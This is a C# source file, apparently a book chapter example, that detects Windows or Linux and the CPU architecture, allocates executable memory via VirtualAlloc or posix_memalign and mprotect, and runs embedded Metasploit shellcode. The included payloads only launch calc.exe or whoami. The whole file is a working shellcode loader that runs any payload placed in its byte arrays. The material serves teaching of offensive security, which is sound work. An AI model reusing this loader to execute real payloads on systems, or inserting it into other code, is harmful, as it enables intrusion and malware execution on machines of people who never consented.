﻿using System;
using System.Runtime.InteropServices;

namespace ch12_crossplatform_metasploit_payloads
{
	class MainClass
	{
		[DllImport("kernel32", SetLastError = true)]
		static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		delegate void WindowsRun();

		[DllImport("libc", SetLastError = true)]
		static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);

		[DllImport("libc", SetLastError = true)]
		static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr size);

		[DllImport("libc", SetLastError = true)]
		static extern void free(IntPtr ptr);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		delegate void LinuxRun();

		public static void Main(string[] args)
		{
			OperatingSystem os = Environment.OSVersion;
			bool x86 = (IntPtr.Size == 4);
			byte[] payload;

			if (os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
			{
				if (!x86)
					/*
                     * windows/x64/exec - 276 bytes
                     * http://www.metasploit.com
                     * VERBOSE=false, PrependMigrate=false, EXITFUNC=process, 
                     * CMD=calc.exe
                     */
					payload = new byte[] { 
					0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
					0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
					0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
					0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
					0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
					0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
					0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
					0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
					0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
					0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
					0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
					0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
					0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
					0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
					0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
					0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
					0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
					0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
					0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };
				else
					/*
                     * windows/exec - 200 bytes
                     * http://www.metasploit.com
                     * VERBOSE=false, PrependMigrate=false, EXITFUNC=process, 
                     * CMD=calc.exe
                     */
					payload = new byte[] { 
					0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30,
					0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
					0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2,
					0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85,
					0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3,
					0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d,
					0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58,
					0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b,
					0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff,
					0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb9, 0x00,
					0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56,
					0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75,
					0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,
					0x2e, 0x65, 0x78, 0x65, 0x00 };

				IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
				Marshal.Copy(payload, 0, ptr, payload.Length);
				WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
				r();
			}
			else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128) //linux
			{ 
				if (!x86)
					/*
                     * linux/x64/exec - 55 bytes
                     * http://www.metasploit.com
                     * VERBOSE=false, PrependSetresuid=false, 
                     * PrependSetreuid=false, PrependSetuid=false, 
                     * PrependSetresgid=false, PrependSetregid=false, 
                     * PrependSetgid=false, PrependChrootBreak=false, 
                     * AppendExit=false, CMD=/usr/bin/whoami
                     */
					payload = new byte[] { 
					0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
					0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x10, 0x00,
					0x00, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x77, 0x68, 0x6f, 0x61,
					0x6d, 0x69, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05 };
				else
					/*
                     * linux/x86/exec - 51 bytes
                     * http://www.metasploit.com
                     * VERBOSE=false, PrependSetresuid=false, 
                     * PrependSetreuid=false, PrependSetuid=false, 
                     * PrependSetresgid=false, PrependSetregid=false, 
                     * PrependSetgid=false, PrependChrootBreak=false, 
                     * AppendExit=false, CMD=/usr/bin/whoami
                     */
					payload = new byte[] { 
					0x6a, 0x0b, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68,
					0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x10, 0x00, 0x00, 0x00, 0x2f,
					0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x00,
					0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80 };


				IntPtr ptr = IntPtr.Zero;
				IntPtr success;
				bool freeMe = false;
				try
				{
					int pagesize = 4096;
					IntPtr length = (IntPtr)(payload.Length + pagesize - 1);
					success = posix_memalign(ref ptr, (IntPtr)32, length);
					if (success != IntPtr.Zero)
					{
						Console.WriteLine("Bail! memalign failed: " + success);
						return;
					}

					freeMe = true;
					IntPtr alignedPtr = (IntPtr)((int)ptr & ~(pagesize - 1)); //get page boundary
					IntPtr mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux
					success = mprotect(alignedPtr, (IntPtr)32, mode);
					if (success != IntPtr.Zero)
					{
						int err = Marshal.GetLastWin32Error();
						Console.WriteLine("Bail! mprotect failed: " + err);
						return;
					}

					Marshal.Copy(payload, 0, ptr, payload.Length);
					LinuxRun r = (LinuxRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(LinuxRun));
					r();
				}
				finally
				{
					if (freeMe)
						free(ptr);
				}
			}
		}


	}
}
